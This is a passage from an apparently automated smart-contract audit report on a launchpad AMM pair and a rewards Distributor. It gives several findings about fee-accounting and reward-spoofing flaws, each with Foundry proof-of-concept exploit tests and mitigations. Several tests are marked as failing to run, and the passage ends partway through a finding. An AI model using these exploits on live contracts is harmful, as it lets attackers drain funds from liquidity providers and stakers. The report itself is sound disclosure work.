2) Still in block N, User A performs a swap providing token0 input and taking a tiny token1 output (amount1Out small). Because timeElapsed == 0, _update accrues launchpad fees (e.g., fee0 = ~amount0In/1000 × LP share) into accruedLaunchpadFee0, subtracts totalLaunchpadFee0 from reserves, but does NOT distribute (balances still include these fees).
3) Still in block N, Attacker calls swap(0, smallAmount1Out, attacker, "") without sending any token0. Since balance0 includes the accrued fees but reserve0 excludes them, swap() computes amount0In = balance0 - (reserve0 - amount0Out) > 0 from the accrued fees alone. The K check passes, and the attacker receives amount1Out > 0 at zero input cost.
4) In the next block N+1, the first call to _update will distribute the previously accrued fee tokens to the Distributor. Net effect: LPs lost token1 (to the attacker) while token0 fee tokens get sent to the Distributor, resulting in a real loss to LPs approximately equal to the value of the same-block accrued fees.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function mint(address to, uint256 amt) external { totalSupply += amt; balanceOf[to] += amt; emit Transfer(address(0), to, amt); }
    function transfer(address to, uint256 amt) external returns (bool) { balanceOf[msg.sender] -= amt; balanceOf[to] += amt; emit Transfer(msg.sender, to, amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) { allowance[from][msg.sender] = a - amt; }
        balanceOf[from] -= amt; balanceOf[to] += amt; emit Transfer(from, to, amt); return true;
    }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; emit Approval(msg.sender, sp, amt); return true; }
}

contract PairFeeTheftTest is Test {
    ERC20Mock t0; ERC20Mock t1; GTELaunchpadV2Pair pair;
    address lpHolder;

    function setUp() public {
        t0 = new ERC20Mock("T0", "T0");
        t1 = new ERC20Mock("T1", "T1");
        pair = new GTELaunchpadV2Pair();
        lpHolder = address(0xA11CE);
        // Initialize with non-zero distributor to enable fee accrual logic.
        pair.initialize(address(t0), address(t1), lpHolder, address(0xBEEF));

        // Seed liquidity
        t0.mint(address(this), 1_000_000 ether);
        t1.mint(address(this), 1_000_000 ether);
        t0.transfer(address(pair), 100_000 ether);
        t1.transfer(address(pair), 100_000 ether);
        pair.mint(lpHolder); // sets blockTimestampLast to now
    }

    function test_SameBlockAccruedFeesCountedAsUserInput() public {
        // 1) First swap in same block: add token0 input to generate accrued fees (timeElapsed == 0)
        t0.transfer(address(pair), 1_000 ether); // provide input0
        uint256 attackerToken1Before = t1.balanceOf(address(this));
        pair.swap(0, 1, address(this), ""); // take tiny output; accrues launchpad fee on amount0In

        // 2) Second swap in same block: steal output using only accrued fees as virtual input
        uint256 pairToken0Before = t0.balanceOf(address(pair));
        pair.swap(0, 1, address(this), ""); // no additional token0 sent
        uint256 pairToken0After = t0.balanceOf(address(pair));
        uint256 attackerToken1After = t1.balanceOf(address(this));

        // Verify: no new token0 entered the pair on the second swap
        assertEq(pairToken0After, pairToken0Before, "token0 balance unchanged on second swap (zero real input)");
        // Attacker received 2 units total (1 per swap), but only funded the first swap
        assertEq(attackerToken1After, attackerToken1Before + 2, "attacker extracted extra output using accrued fees");
    }
}


## Suggested Mitigation
Exclude undistributed accrued fees from balance-based accounting inside swap(). Specifically, compute amountIn and the K-check from balances net of previously accrued (but undistributed) launchpad fees:

- After reading balances, derive net balances:
  balance0Net = balance0 - accruedLaunchpadFee0; balance1Net = balance1 - accruedLaunchpadFee1.
- Compute inputs using net balances: amount0In = balance0Net > (_reserve0 - amount0Out) ? balance0Net - (_reserve0 - amount0Out) : 0; similarly for amount1In.
- Use balance0Net/balance1Net for balance{0,1}Adjusted in the K invariant.

This ensures accrued fees do not get miscounted as user input in same-block swaps. Alternatively, proactively distribute accrued fees before computing amountIn whenever there are pending fees (accruedLaunchpadFee*) even if timeElapsed == 0, but the net-balance approach is simpler and avoids extra external calls.





 **Derived From** : Invariant Type: Arithmetic

## [M-12]. Yield Theft and LP Dilution via `burn` During Fee Accrual

### Finding Severity Justification: The burn function computes withdrawal amounts from raw balances that include undistributed accruedLaunchpadFee. If a burn occurs in the same block as a fee-accruing swap (before _update distributes fees), the exiting LP withdraws a pro‑rata share of those accrued fees. Subsequent _update subtracts the full accrued fee from the remaining balance, depressing reserves and effectively stealing value from remaining LPs. This results in direct asset loss to other LPs. The impact is real but the exploit window requires timing within the same block, reducing likelihood and expected magnitude per event.
## Derived From Pattern/Invariant
Invariant Type: Arithmetic

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair.burn` function calculates the amount of tokens to return to the liquidity provider based on the *total* balance of the contract, which includes `accruedLaunchpadFee` that has not yet been distributed. 

```solidity
amount0 = liquidity.mul(balance0) / _totalSupply;
```

If `burn` is called in the same block as a fee-generating swap (or any time before `_distributeLaunchpadFees` clears the accrual), the exiting LP withdraws a pro-rata share of the fees in addition to their share of the reserves. When `_update` is subsequently called at the end of `burn`, it subtracts the *full* `accruedLaunchpadFee` from the remaining balance to determine the new reserves.

Because the exiting LP took a portion of the tokens backing the fee liability, the deduction of the full fee amount from the *remaining* balance artificially depresses the `reserve` variables. This effectively steals value from the remaining liquidity providers.

## Impact
An LP can withdraw more than their fair share by burning in a block where swap fees were accrued but not yet distributed. Because burn uses raw balances (which include accrued fees), the burner receives a pro‑rata slice of fees owed to the distributor. Later, when fees are distributed, the full accrued amount is pulled from the contract, depressing reserves for remaining LPs. The stolen amount equals the burner’s LP share of the currently accrued (undistributed) fees. This can be repeated in busy blocks and results in direct, realized loss to other LPs.

## Command to Run Test


## Proof of Concept
Scenario (single token leg shown for clarity):
1) Initial state: reserves0 = 1000, reserves1 = 1000, totalSupply ≈ 1000 LP. Alice holds 10% of LP, Bob 90%.
2) Trader performs a swap in the same block, creating amount0In > 0 and accruing launchpad fees fee0 > 0. In swap._update (timeElapsed == 0), accruedLaunchpadFee0 is increased but not distributed. Reserves are set to reserve0 = balance0 - (accruedLaunchpadFee0 + newFee0), excluding the fee amount.
3) Alice immediately burns her 10% LP in the same block. burn() computes amount0 = (liquidity * balance0) / totalSupply, where balance0 still includes the accrued fee0. Alice receives her rightful share of reserves0 plus 10% of fee0.
4) Next block, any call (e.g., sync) triggers _update with timeElapsed > 0. The pair distributes the full accrued fee0 to the distributor and then sets reserves to reserve0 = pre-distribution balance0 - fee0. Because Alice already took 10% of fee0 in step 3, but the pair still distributes 100% of fee0, the reserves for remaining LPs are short by exactly Alice’s pro‑rata share of the fee0.
5) Net effect: Bob’s remaining position is diluted by Alice’s share of the pending fees; Alice captured value intended for the distributor/LP program.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        allowance[from][msg.sender] = a - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract YieldTheftBurnDuringAccrualTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor distributor;
    MockERC20 token0;
    MockERC20 token1;

    address LPB = address(0xBEEF); // launchpad LP holder
    address LPA = address(0xA11CE); // attacker LP holder (10%)
    address TRADER = address(0x1337);
    address STAKER = address(0x5151);

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        distributor = new Distributor();
        distributor.initialize(address(this)); // test contract acts as launchpad
        distributor.createRewardsPair(address(token0), address(token1));
        distributor.increaseStake(address(token0), STAKER, 1); // ensure totalShares > 0 so addRewards won't revert

        pair = new GTELaunchpadV2Pair(); // factory = address(this)
        pair.initialize(address(token0), address(token1), LPB, address(distributor));

        // Seed initial liquidity 1000:1000 from LPB
        token0.mint(LPB, 2000 ether);
        token1.mint(LPB, 2000 ether);
        vm.startPrank(LPB);
        token0.transfer(address(pair), 1000 ether);
        token1.transfer(address(pair), 1000 ether);
        pair.mint(LPB);
        vm.stopPrank();

        // Give trader funds
        token0.mint(TRADER, 5000 ether);
    }

    function getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        // UniswapV2 formula with 0.3% fee => multiply reserves by 1000 and subtract 3*amountIn
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function test_ExploitYieldTheftOnBurn() public {
        // Confirm initial reserves
        (uint112 r0, uint112 r1,) = pair.getReserves();
        assertEq(r0, 1000 ether);
        assertEq(r1, 1000 ether);

        // Transfer ~10% of LP from LPB to LPA (attacker)
        uint256 lpBalB = pair.balanceOf(LPB);
        uint256 lpToA = lpBalB / 10; // 10%
        vm.prank(LPB);
        pair.transfer(LPA, lpToA);
        assertEq(pair.balanceOf(LPA), lpToA);

        // In the same block: Trader performs a swap that accrues launchpad fee on token0
        uint256 amount0In = 1000 ether; // sizable to make fee measurable
        vm.startPrank(TRADER);
        token0.transfer(address(pair), amount0In);
        // Compute amount1Out using current reserves
        (r0, r1,) = pair.getReserves();
        uint256 amount1Out = getAmountOut(amount0In, r0, r1);
        pair.swap(0, amount1Out, TRADER, "");
        vm.stopPrank();

        // After swap in same block: fees are accrued (not distributed), reserves exclude accrued fees
        (uint112 accFee0,,) = pair.getAccruedLaunchpadFees();
        assertGt(accFee0, 0, "fee must accrue");

        // Snapshot state for expected fair burn
        (r0, r1,) = pair.getReserves();
        uint256 ts = pair.totalSupply();
        uint256 expected0 = (lpToA * uint256(r0)) / ts; // rightful share excludes accrued fees
        uint256 expected1 = (lpToA * uint256(r1)) / ts;

        // Attacker burns immediately in same block (withdraws from balances including accrued fees)
        uint256 a0Before = token0.balanceOf(LPA);
        uint256 a1Before = token1.balanceOf(LPA);
        vm.startPrank(LPA);
        pair.transfer(address(pair), lpToA);
        pair.burn(LPA);
        vm.stopPrank();

        uint256 a0After = token0.balanceOf(LPA);
        uint256 a1After = token1.balanceOf(LPA);
        uint256 out0 = a0After - a0Before;
        uint256 out1 = a1After - a1Before;

        // The attacker must receive at least rightful share, plus some of the accrued fee on token0
        assertGe(out0, expected0, "should get >= rightful share");
        assertEq(out1, expected1, "no fee accrued on token1 in this scenario");
        uint256 stolen0 = out0 - expected0;
        assertGt(stolen0, 0, "attacker captured a slice of accrued fee");

        // Move to next block and trigger fee distribution (which will deduct full accrued fee from pair)
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        uint256 distBalBefore = token0.balanceOf(address(distributor));
        pair.sync();
        uint256 distBalAfter = token0.balanceOf(address(distributor));
        assertEq(distBalAfter - distBalBefore, uint256(accFee0), "distributor pulled full accrued fee");

        // Post-distribution reserves reflect the theft (remaining LPs lost `stolen0` worth of token0)
        // Not strictly asserting exact reserve delta due to swap math, but stolen0 > 0 proves the over-withdrawal
    }
}


## Suggested Mitigation
In burn(), compute withdrawal amounts from balances net of total accrued launchpad fees (or equivalently, from reserves), so LPs cannot withdraw protocol fees that haven’t been distributed yet.

Example fix inside burn():
- Read balances as before.
- Subtract accrued fees from balances prior to pro-rata calculation.

    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    address _token0 = token0;
    address _token1 = token1;
    uint256 balance0 = IERC20(_token0).balanceOf(address(this));
    uint256 balance1 = IERC20(_token1).balanceOf(address(this));
    uint256 liquidity = balanceOf[address(this)];
    bool feeOn = _mintFee(_reserve0, _reserve1);
    uint256 _totalSupply = totalSupply;

    // Adjust balances by accrued fees before pro-rata
    uint256 adjBal0 = balance0 - uint256(accruedLaunchpadFee0);
    uint256 adjBal1 = balance1 - uint256(accruedLaunchpadFee1);

    amount0 = liquidity * adjBal0 / _totalSupply;
    amount1 = liquidity * adjBal1 / _totalSupply;

Alternatively, compute amounts using reserves directly:

    amount0 = liquidity * uint256(_reserve0) / _totalSupply;
    amount1 = liquidity * uint256(_reserve1) / _totalSupply;

Either approach ensures the exiting LP only receives their share of true pool reserves, not the undistributed protocol fees.





 **Derived From** : Arithmetic Invariant: amount0 <= (balance0 - accruedLaunchpadFee0) * (liquidity / totalSupply)

## [H-13]. Liquidity Providers can steal accrued Launchpad fees via burn, also causing DoS

### Finding Severity Justification: Accrued launchpad fees (owed to the Distributor/protocol) are included in burn payouts, allowing LPs to withdraw a pro‑rata share of those fees (direct asset theft). Additionally, burns can revert when fees > remaining balances post-payout, causing a denial-of-service for large/last LPs. Both represent real, user-facing and protocol-facing fund loss with a clear, permissionless attack path.
## Derived From Pattern/Invariant
Arithmetic Invariant: amount0 <= (balance0 - accruedLaunchpadFee0) * (liquidity / totalSupply)

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair.burn` function calculates the amounts of tokens to return to the LP using the contract's total balance (`balanceOf(address(this))`). This balance includes `accruedLaunchpadFee` which belongs to the protocol/distributor, not the LPs. By burning liquidity, an LP withdraws a pro-rata share of the reserves **plus** the accrued fees. 

Additionally, `_update` is called at the end of `burn` to sync reserves. It subtracts the full `totalLaunchpadFee` from the remaining balance. If an LP holds a large share (or is the last LP), withdrawing their share of the fees leaves insufficient balance to cover the full fee liability, causing `reserve = balance - fees` to underflow and revert. This locks the funds.

## Impact
Accrued launchpad fees (intended for the Distributor) are mistakenly included in LP burn payouts, allowing any LP to withdraw a proportional share of those fees (protocol fund theft). Additionally, burns for very large holders or the last LP can revert if pending fees exceed the post-payout balance, causing a denial-of-service for liquidity withdrawal. While the DoS can be sidestepped by first triggering a fee distribution (e.g., a sync/swap in a later block when the distributor is set), it is still a user-facing liveness failure; the theft remains unconditional until fixed.

## Command to Run Test


## Proof of Concept
Consider token0 with reserves R0=1000 and pending launchpad fee F0=100 tracked in accruedLaunchpadFee0. The pair’s actual balance is B0=R0+F0=1100 (fee is still held by the pair). An LP holding fraction f of total LP supply burns liquidity in the same block: burn() computes amount0=f*B0, paying out a proportional share of fees. For example: f=50% ⇒ amount0=0.5*1100=550 (correct share should exclude fee: 0.5*(1100-100)=500). The LP steals 50. After transfer, _update() tries to set reserve0 to balance0−F0. For the last LP (f≈1), post-payout balance0≈0, so reserve0=0−F0 underflows and reverts, preventing withdrawal.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; emit Transfer(address(0), to, amt);}    
    function transfer(address to, uint256 amt) external returns(bool){ require(balanceOf[msg.sender]>=amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; emit Transfer(msg.sender,to,amt); return true; }
    function approve(address sp, uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; emit Approval(msg.sender, sp, amt); return true; }
    function transferFrom(address from,address to,uint256 amt) external returns(bool){ uint256 a=allowance[from][msg.sender]; require(a>=amt && balanceOf[from]>=amt, "allow"); if(a!=type(uint256).max) allowance[from][msg.sender]=a-amt; balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); return true; }
}

contract FactoryMock {
    address public feeToAddr;
    function feeTo() external view returns (address) { return feeToAddr; }
    function setFeeTo(address a) external { feeToAddr = a; }
    function createPair(address t0, address t1, address launchpadLp, address distributor) external returns (GTELaunchpadV2Pair p) {
        p = new GTELaunchpadV2Pair();
        p.initialize(t0, t1, launchpadLp, distributor); // only factory (this) can call
    }
}

contract PairBurnFeesTest is Test {
    using stdStorage for StdStorage;

    MockERC20 token0; MockERC20 token1; FactoryMock factory; GTELaunchpadV2Pair pair; address lp;

    function setUp() public {
        token0 = new MockERC20("T0","T0");
        token1 = new MockERC20("T1","T1");
        factory = new FactoryMock();
        pair = factory.createPair(address(token0), address(token1), address(0xBEEF), address(0)); // distributor=0 to avoid auto-collection
        lp = address(0xA11CE);

        // Seed initial liquidity: 1000e18 each
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(lp); // mints LP tokens to lp
    }

    function _setAccruedFee0(uint112 fee0) internal {
        // write accruedLaunchpadFee0
        stdstore.target(address(pair)).sig(pair.accruedLaunchpadFee0.selector).checked_write(fee0);
    }

    function test_Burn_IncludesAccruedFees_Theft() public {
        // Simulate pending fees in pair balance: F0=100e18, add to balance and storage
        token0.mint(address(pair), 100 ether);
        _setAccruedFee0(uint112(100 ether));

        // LP burns half of her LP balance (must transfer LP to pair first)
        uint256 liqOwned = pair.balanceOf(lp);
        uint256 liqToBurn = liqOwned / 2;
        // Pre-calc expected amounts
        uint256 totalSupply = pair.totalSupply();
        uint256 B0 = token0.balanceOf(address(pair)); // 1100e18
        uint256 F0 = 100 ether;
        uint256 expectedInc0 = (liqToBurn * B0) / totalSupply;            // includes fee
        uint256 expectedExc0 = (liqToBurn * (B0 - F0)) / totalSupply;    // correct excluding fee
        uint256 stolen0 = expectedInc0 - expectedExc0;
        assertGt(stolen0, 0, "no theft computed");

        uint256 preLpT0 = token0.balanceOf(lp);
        vm.startPrank(lp);
        pair.transfer(address(pair), liqToBurn);
        (uint256 a0, uint256 a1) = pair.burn(lp);
        vm.stopPrank();

        // Validate payout equals balance-based formula and theft > 0
        assertEq(a0, expectedInc0, "payout0 mismatch");
        assertGt(token0.balanceOf(lp) - preLpT0, expectedExc0, "should exceed fee-excluded share");
        assertEq(token0.balanceOf(lp) - preLpT0, expectedInc0, "user got balance-based share");
    }

    function test_BurnAll_Reverts_DoS_WhenFeesPending() public {
        // New pending fees F0=100e18 and funds present in pair
        token0.mint(address(pair), 100 ether);
        _setAccruedFee0(uint112(100 ether));

        // Transfer all user LP to pair and attempt to burn
        uint256 liqAll = pair.balanceOf(lp);
        vm.startPrank(lp);
        pair.transfer(address(pair), liqAll);
        vm.expectRevert(); // underflow when _update subtracts fees from near-zero balance
        pair.burn(lp);
        vm.stopPrank();
    }
}


## Suggested Mitigation
In burn(), exclude pending launchpad fees from the LP payout calculation. Example: compute amounts using balances net of total launchpad fees: amount0 = liquidity * (balance0 - accruedLaunchpadFee0) / _totalSupply; amount1 = liquidity * (balance1 - accruedLaunchpadFee1) / _totalSupply. This preserves the invariant that reserves equal balances minus fees, prevents LPs from withdrawing fee-owed funds, and removes the underflow/DoS on large burns. Optionally, for robustness, you can pre-snapshot the fees at the start of burn and use those snapshots for the computation.





 **Derived From** : Invariant Type: Referential

## [H-14]. Permanent DoS of Reward Claiming via Token Spoofing in Distributor

### Finding Severity Justification: A permissionless caller can corrupt a rewards pool by supplying a mismatched quote token in Distributor.addRewards. This inflates pendingQuoteRewards and accQuoteRewardPerShare without depositing the real quote asset tracked by the pool. Thereafter, user claims (and stake/unstake distributions) revert when _decreaseTotalPending tries to deduct from totalPendingRewards[realQuote], effectively freezing matured rewards until an external backfill occurs. Freezing matured user yield is a High impact per the rubric.
## Derived From Pattern/Invariant
Invariant Type: Referential

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor.addRewards` function fails to verify that the `quoteAsset` parameter matches the pool's actual configured `quoteAsset`. It blindly uses the input `quoteAsset` address to update the internal accounting (`pendingQuoteRewards`) and to transfer tokens from the caller. 

A malicious user can call `addRewards` passing the correct `launchAsset` (token0) but a worthless `JunkToken` as `token1` (the `quoteAsset` parameter). The contract will accept the `JunkToken` transfer but increment the `pendingQuoteRewards` counter for the pool, which effectively tracks liabilities in the *real* quote asset (e.g., USDC).

This creates an accounting mismatch: the pool thinks it has more pending USDC rewards than it actually holds. When legitimate users try to `claimRewards`, the contract calculates the payout based on the inflated `accQuoteRewardPerShare` but attempts to transfer the real quote asset. The `_decreaseTotalPending` check (or the transfer itself if balances are tracked globally) will fail because `totalPendingRewards[RealQuoteAsset]` was never incremented by the attacker. This permanently reverts all claim transactions for that pool.

## Impact
A permissionless caller can corrupt a rewards pool by supplying a mismatched quote token to Distributor.addRewards. This inflates the pool’s pendingQuoteRewards and accQuoteRewardPerShare, but deposits the wrong token into the Distributor and increases totalPendingRewards for that wrong token. All subsequent reward distributions that touch the quote side (claimRewards and the quote leg of increaseStake/decreaseStake) revert with ClaimAmountExceedsTotalPendingRewards because they attempt to deduct from totalPendingRewards[realQuote], which was never increased. The denial-of-service persists until an external party backfills the real quote asset; additionally, the spoofed tokens become permanently stranded under totalPendingRewards[junk] and cannot be skimmed. This freezes user yield and can disrupt bonding operations that rely on reward distribution.

## Command to Run Test


## Proof of Concept
1) Launch a rewards pool for LaunchToken/USDC so that RewardsTrackerStorage.getRewardPool(LaunchToken).quoteAsset == USDC.
2) Ensure the pool has non-zero shares (e.g., via Distributor.increaseStake during bonding).
3) Attacker deploys JunkToken and approves Distributor.
4) Attacker calls Distributor.addRewards(LaunchToken, JunkToken, 0, J), passing the correct base (LaunchToken) but a fake quote (JunkToken).
5) The function identifies LaunchToken as the base (since its pool exists) and blindly records J as quoteAsset for accounting purposes in this call, incrementing rs.pendingQuoteRewards by J and totalPendingRewards[JunkToken] by J, and transfers J from attacker.
6) No real USDC was deposited and totalPendingRewards[USDC] remains unchanged.
7) When any user tries claimRewards(LaunchToken), rs.update accrues the inflated pendingQuoteRewards into accQuoteRewardPerShare, so a positive quoteAmount is owed. Distributor._distributeAssets then calls _decreaseTotalPending(USDC, quoteAmount), which reverts with ClaimAmountExceedsTotalPendingRewards because totalPendingRewards[USDC] < quoteAmount. Claims and any reward-bearing stake/unstake paths are now stuck until someone backfills real USDC.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; totalSupply += amt; emit Transfer(address(0), to, amt); }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp] = amt; emit Approval(msg.sender, sp, amt); return true; }
    function transfer(address to, uint256 amt) external returns (bool) { _transfer(msg.sender, to, amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) { require(a >= amt, "allow"); allowance[from][msg.sender] = a - amt; }
        _transfer(from, to, amt); return true;
    }
    function _transfer(address from, address to, uint256 amt) internal { require(balanceOf[from] >= amt, "bal"); balanceOf[from] -= amt; balanceOf[to] += amt; emit Transfer(from, to, amt); }
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

contract AddRewardsSpoofingTest is Test {
    Distributor distributor;
    MockERC20 lt; // launch token
    MockERC20 usdc; // real quote
    MockERC20 junk; // spoofed quote
    address alice = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set this test as launchpad (onlyLaunchpad)

        lt = new MockERC20("LT", "LT", 18);
        usdc = new MockERC20("USDC", "USDC", 6);
        junk = new MockERC20("JUNK", "JUNK", 18);

        // Create the rewards pair (LaunchToken -> USDC)
        distributor.createRewardsPair(address(lt), address(usdc));

        // Ensure the pool has shares so addRewards won't revert
        distributor.increaseStake(address(lt), alice, 1000);

        // Attacker funds junk and approves distributor
        junk.mint(address(this), 1e18);
        junk.approve(address(distributor), type(uint256).max);

        // Exploit: add quote rewards with a mismatched (junk) quote token
        distributor.addRewards(address(lt), address(junk), 0, 1e18);
    }

    function test_SpoofingFreezesClaims() public {
        // Alice attempts to claim her quote rewards (which are now accounted as USDC)
        vm.prank(alice);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(lt));
    }
}


## Suggested Mitigation
In addRewards, require that the provided pair matches the stored pool configuration and always use the stored quote asset for accounting and transfers. A robust pattern is:
- Determine which input is the base by checking which getRewardPool(token).quoteAsset != address(0).
- Let expectedQuote = rs.quoteAsset for that base; require that the other input token equals expectedQuote, otherwise revert InvalidQuoteAsset.
- Use expectedQuote (not the untrusted parameter) for rs.addQuoteRewards(...), _increaseTotalPending, and safeTransferFrom.

Example patch outline:
- After resolving rs and launchAsset, set address expectedQuote = rs.quoteAsset; address other = token0IsBase ? token1 : token0; if (other != expectedQuote) revert InvalidQuoteAsset();
- For base rewards: transferFrom launchAsset as today.
- For quote rewards: call rs.addQuoteRewards(launchAsset, expectedQuote, quoteAmount), then _increaseTotalPending(expectedQuote, quoteAmount), then expectedQuote.safeTransferFrom(msg.sender, address(this), quoteAmount).

Optionally, you can ignore the passed quote address entirely (derive it solely from storage) to eliminate this class of bugs even if future callers pass malformed inputs.





 **Derived From** : Issue Type: ReserveOrPriceDesync / Missing Asset Validation in addRewards Enables Reward Theft

## [H-15]. Asset Validation Bypass in addRewards Allows Reward Theft

### Finding Severity Justification: addRewards allows anyone to credit quote rewards for a launchAsset using an arbitrary token without verifying it matches the pool’s configured quote asset. This inflates pendingQuoteRewards and accQuoteRewardPerShare, enabling a staker to claim a disproportionate share of legitimate quote tokens (e.g., USDC) from the Distributor. Impact is direct theft/denial of rewards for honest users and can drain all currently pending legitimate quote rewards for the pool (and potentially starve other pools sharing the same quote asset). The attack is permissionless and requires only the ability to transfer arbitrary fake tokens.
## Derived From Pattern/Invariant
Issue Type: ReserveOrPriceDesync / Missing Asset Validation in addRewards Enables Reward Theft

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The exploit path is clear from the provided code and matches standard reward-inflation bugs. Slight uncertainty stems from a generic "Lack of explicit asset validation" item listed in known OOS issues; however, that item is too broad to conclusively cover this specific bug here.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor.addRewards` function allows anyone to add rewards to a pool. It correctly identifies the storage struct `rs` for the launch asset, but it fails to verify that the supplied `quoteAsset` (token1) matches the immutable `rs.quoteAsset` stored in the pool configuration. An attacker can call `addRewards(LaunchToken, FakeToken, 0, amount)`. The function calculates the pool based on `LaunchToken`, but uses `FakeToken` to increment `rs.pendingQuoteRewards` and transfers `FakeToken` to the contract. 

Crucially, `rs.pendingQuoteRewards` is used by `RewardsTrackerLib` to update the global reward accumulator (`accQuoteRewardPerShare`) which drives the distribution of the *legitimate* quote asset (e.g., USDC). When users (including the attacker) claim rewards, the contract calculates the payout based on the inflated accumulator and transfers the *legitimate* quote asset (stored in `rs.quoteAsset`) via `_distributeAssets`. This allows an attacker to dilute the pool and steal legitimate rewards owed to other users. If the attacker holds a stake, they can claim a disproportionately large share of the real assets, potentially draining the `totalPendingRewards` budget and preventing honest users from claiming.

## Impact
An attacker can inflate a pool’s quote reward accumulator by calling addRewards with a fake quote token, then claim a disproportionate share of the legitimate quote asset (e.g., USDC). This can drain all currently pending legitimate quote rewards for that pool. Because totalPendingRewards is aggregated per-asset across all pools, the attacker can also deplete the global escrow for the same quote asset, starving other pools that share that asset. Funds are stolen from honest users’ pending rewards and the protocol’s reward escrow is misallocated.

## Command to Run Test


## Proof of Concept
1. Alice and Bob each stake 50% of the total shares in a LaunchToken pool. The reward asset is USDC.
2. Admin adds 1,000 USDC rewards. `totalPendingRewards[USDC]` = 1,000. `rs.pendingQuoteRewards` = 1,000.
3. Bob calls `addRewards(LaunchToken, FakeToken, 0, 1000)`. `rs.pendingQuoteRewards` increases to 2,000. Bob transfers 1,000 FakeTokens.
4. Bob calls `claimRewards`. `rs.update` calculates the accumulator based on 2,000 units. Bob owns 50%, so he claims 1,000 units.
